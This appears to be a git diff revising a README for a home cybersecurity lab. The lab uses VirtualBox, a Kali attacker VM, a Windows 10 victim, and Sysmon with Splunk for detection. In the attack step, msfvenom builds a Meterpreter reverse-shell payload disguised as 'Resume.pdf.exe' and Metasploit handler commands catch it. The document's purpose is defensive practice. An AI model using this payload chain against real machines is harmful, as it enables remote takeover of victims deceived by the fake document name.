@@ -1,78 +1,114 @@
-🏠 Cybersecurity Home Lab Manual
+# 🏠 Cybersecurity Home Lab
 
-This guide documents the full process of building and using a defensive + offensive home lab with VirtualBox, Kali Linux, Windows 10, Sysmon, and Splunk. The goal is to simulate real-world attack and detection workflows.
+A step-by-step guide to building and practicing in your own safe cybersecurity environment.  
+This project demonstrates how to set up a home lab using **VirtualBox**, simulate attacks from **Kali**, collect endpoint telemetry with **Sysmon**, and analyze it in **Splunk**.
 
-1. Lab Architecture
+---
 
-VirtualBox is used as the hypervisor.
+## Table of Contents
 
-Internal Network configured so VMs can talk to each other but not the internet.
+- [Lab Setup Overview](#lab-setup-overview)
+- [Step 1 – Create the Virtual Machines](#step-1--create-the-virtual-machines)
+- [Step 2 – Verify Connectivity](#step-2--verify-connectivity)
+- [Step 3 – Install Splunk on Windows](#step-3--install-splunk-on-windows)
+- [Step 4 – Install and Configure Sysmon](#step-4--install-and-configure-sysmon)
+- [Step 5 – Configure Splunk to Ingest Logs](#step-5--configure-splunk-to-ingest-logs)
+- [Step 6 – Simulate an Attack (Kali → Windows)](#step-6--simulate-an-attack-kali--windows)
+- [Step 7 – Analyze in Splunk](#step-7--analyze-in-splunk)
+- [Final Results](#final-results)
+- [Next Steps](#next-steps)
+- [References](#references)
 
-Static IPs assigned:
+---
 
-Windows 10 VM → 192.168.20.10
+## Lab Setup Overview
 
-Kali Linux VM → 192.168.20.11
+- **Hypervisor**: VirtualBox  
+- **Operating Systems**:  
+  - Kali Linux (Attacker) – `192.168.20.11`  
+  - Windows 10 (Victim) – `192.168.20.10`  
+- **Network Mode**: Internal Network (isolated; no internet)  
+- **Tools Installed**:  
+  - Sysmon (on Windows)  
+  - Splunk Enterprise (on Windows)  
+  - Splunk Add-on for Sysmon (manual .spl upload)  
+  - Metasploit Framework (on Kali)
 
-Diagram
-[ Kali Linux Attacker ] 192.168.20.11
-        |
-   (Internal Network)
-        |
-[ Windows 10 Victim + Splunk ] 192.168.20.10
+---
 
-2. Windows 10 VM Setup
+## Step 1 – Create the Virtual Machines
 
-Install Windows 10 ISO in VirtualBox.
+1. Install **VirtualBox** on your host.  
+2. Create two VMs:
+   - **Kali Linux** (attacker)
+   - **Windows 10** (victim)
+3. Set **Network Adapter** to `Internal Network` for both VMs.  
+4. Assign static IPs:
+   - Windows → `192.168.20.10`
+   - Kali → `192.168.20.11`
 
-Disable auto-boot from ISO after installation (to avoid reinstall each reboot).
+> Tip: After installing Windows from ISO, remove the ISO from the virtual CD drive (Settings → Storage) so it boots from the disk and doesn’t re-run setup.
 
-Assign static IP:
+---
 
-IP: 192.168.20.10
+## Step 2 – Verify Connectivity
 
-Subnet: 255.255.255.0
+From **Kali**, ping Windows:
 
-Gateway: leave blank (no internet).
+```bash
+ping 192.168.20.10
+```
 
-Install Splunk Enterprise (free):
+From **Windows**, ping Kali:
 
-Download on host → copy into VM.
+```powershell
+ping 192.168.20.11
+```
 
-Install to default path C:\Program Files\Splunk.
+> If ping from Kali fails, enable the Windows Firewall rule: **File and Printer Sharing (Echo Request - ICMPv4-In)**.
 
-Start Splunk via browser: https://localhost:8000.
+---
 
-3. Sysmon Deployment
+## Step 3 – Install Splunk on Windows
 
-Download Sysmon from Microsoft Sysinternals on host → copy to Windows VM.
+1. Download **Splunk Enterprise** on the host, copy into the VM (Shared Folders/USB).  
+2. Install with defaults; set admin credentials.  
+3. Start Splunk and open locally in the VM:
 
-Install with config:
+```
+http://localhost:8000
+```
 
-sysmon64.exe -i sysmonconfig.xml
+---
 
+## Step 4 – Install and Configure Sysmon
 
-(The XML defines what events Sysmon collects).
+1. Download **Sysmon** on the host and copy to the Windows VM.  
+2. (Recommended) Use a config XML (SwiftOnSecurity or a minimal lab config).  
+3. Install Sysmon (Admin PowerShell):
 
-Verify logs:
+```powershell
+Sysmon64.exe -accepteula -i C:\Tools\sysmonconfig.xml
+```
 
-Open Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational.
+4. Verify events appear in Event Viewer:  
+   **Applications and Services Logs → Microsoft → Windows → Sysmon → Operational**
 
-4. Splunk Configuration for Logs
+---
 
-Create a new index in Splunk:
+## Step 5 – Configure Splunk to Ingest Logs
 
-Settings → Indexes → endpoint.
+1. Create an index **endpoint** in Splunk (Settings → Indexes → New Index).  
+2. Create a small app to hold your inputs (recommended):
 
-Create a small Splunk inputs.conf app:
-
-Path:
-
+Create file:
+```
 C:\Program Files\Splunk\etc\apps\TA-lab-win\local\inputs.conf
+```
 
+Put this content inside:
 
-Content:
-
+```ini
 [WinEventLog://Microsoft-Windows-Sysmon/Operational]
 disabled = 0
 index = endpoint
@@ -97,108 +133,96 @@ index = endpoint
 [WinEventLog://Microsoft-Windows-Windows Defender/Operational]
 disabled = 0
 index = endpoint
+```
 
+3. Restart Splunk service:
 
-Restart Splunk service:
-
+```powershell
 net stop splunkd
 net start splunkd
+```
 
+4. Verify ingestion:
 
-Verify ingestion in Search:
-
+```spl
 index=endpoint | stats count by sourcetype
+```
 
-5. Kali Linux VM Setup
+You should see: `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` (and others you enabled).
 
-Install Kali Linux ISO in VirtualBox.
+---
 
-Assign static IP:
+## Step 6 – Simulate an Attack (Kali → Windows)
 
-IP: 192.168.20.11.
+**On Kali – generate payload (64-bit, reverse TCP):**
 
-Install tools (already preloaded in Kali):
-
-nmap, msfvenom, metasploit-framework.
-
-6. Reconnaissance (Attacker → Victim)
-
-From Kali, scan Windows:
-
-nmap -Pn -A 192.168.20.10
-
-
-If RDP is enabled → you’ll see 3389/tcp open.
-
-Other ports may be closed unless you expose them.
-
-7. Exploitation with Metasploit
-
-On Kali, generate payload:
-
+```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe
+```
 
+**Start handler in Metasploit:**
 
-Host file for transfer:
-
-python3 -m http.server 9999
-
-
-On Windows VM, download file (simulate user action).
-
-On Kali, start listener:
-
+```text
 msfconsole
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.20.11
 set LPORT 4444
 run
+```
 
-8. Detection in Splunk
-Search 1: Network Connections (Sysmon Event ID 3)
+**Deliver & execute** `Resume.pdf.exe` on the Windows VM (via Shared Folder/USB).  
+You should see a **meterpreter session** open on Kali.
+
+> Only run the payload inside your isolated VM. Do not execute on your host.
+
+---
+
+## Step 7 – Analyze in Splunk
+
+**A) Network callbacks (Sysmon Event ID 3):**
+
+```spl
 index=endpoint sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 dest_ip=192.168.20.11
+```
 
+**B) Malicious process creation (Sysmon Event ID 1):**
 
-Shows Windows connecting back to Kali’s 4444 port.
+```spl
+index=endpoint sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\Resume.pdf.exe"
+```
 
-Search 2: Process Creation (Sysmon Event ID 1)
-index=endpoint sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*Resume.pdf.exe"
+**C) Quick sanity – ports seen:**
 
+```spl
+index=endpoint EventCode=3 | stats count by dest_port | sort - count
+```
 
-Shows execution of the dropped malware.
+You should observe an outbound connection to your Kali machine on **port 4444** and a process creation event for `Resume.pdf.exe` (often followed by `cmd.exe`).
 
-Search 3: General endpoint visibility
-index=endpoint | stats count by EventCode, Image, dest_ip, dest_port
+---
 
-9. Lab Outcomes
+## Final Results
 
-✅ You simulated a realistic attack chain:
+- **Attack simulation**: Kali generated a msfvenom payload and received a reverse shell from Windows.  
+- **Detection**: Sysmon captured process creation (ID 1) and network connections (ID 3).  
+- **Analysis**: Splunk searches surfaced the execution of `Resume.pdf.exe` and the callback to `192.168.20.11:4444`.
 
-Recon (Nmap)
+This lab demonstrates an end-to-end **attack → detect → analyze** workflow.
 
-Exploit (Meterpreter via MSFVenom)
+---
 
-Execution (malware run on Windows)
+## Next Steps
 
-Detection (Sysmon + Splunk).
+- Install the **Splunk Add-on for Sysmon** (offline .spl) for richer field extraction.  
+- Add a **dashboard** with panels for EventCode=1 and EventCode=3.  
+- Expand the lab: honeypot (Cowrie), IDS (Zeek/Suricata), SIEM correlation, SOAR automation.
 
-✅ You learned:
+---
 
-How to build internal network lab safely (no internet exposure).
+## References
 
-How to integrate Sysmon with Splunk for monitoring.
-
-How to detect attacker activity via Splunk searches.
-
-10. Next Steps
-
-Add Splunk App for Sysmon (offline install).
-
-Try other payloads (PowerShell Empire, Cobalt Strike trial).
-
-Add more logs: DNS, Firewall, Registry.
-
-Write Splunk detections (correlation searches).
-
-Expand: Linux server + ELK stack, pfSense firewall, SIEM correlation.
+- Sysmon: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon  
+- Sysmon Configs: https://github.com/SwiftOnSecurity/sysmon-config  
+- Splunk Docs: https://docs.splunk.com/  
+- Metasploit: https://www.metasploit.com/
